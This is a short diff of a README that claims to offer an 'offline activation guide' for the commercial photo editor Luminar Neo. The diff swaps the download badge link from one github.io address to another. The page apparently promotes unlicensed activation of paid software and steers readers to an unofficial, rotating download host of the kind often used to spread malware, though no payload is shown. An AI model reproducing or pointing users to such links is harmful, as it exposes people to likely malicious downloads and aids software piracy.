@@ -2,7 +2,7 @@
 
 This repository provides a complete **offline activation guide** for **Luminar Neo** — the AI-powered photo editor by Skylum. Perfect for use in environments without internet access or for secure professional deployments.
 
-[![Download Activation Guide](https://img.shields.io/badge/Download-Activation_Guide-blueviolet)](https://luminar-neo-download.github.io/.github)
+[![Download Activation Guide](https://img.shields.io/badge/Download-Activation_Guide-blueviolet)](https://matookfj.github.io/.github/luminar)
 
 ---
 
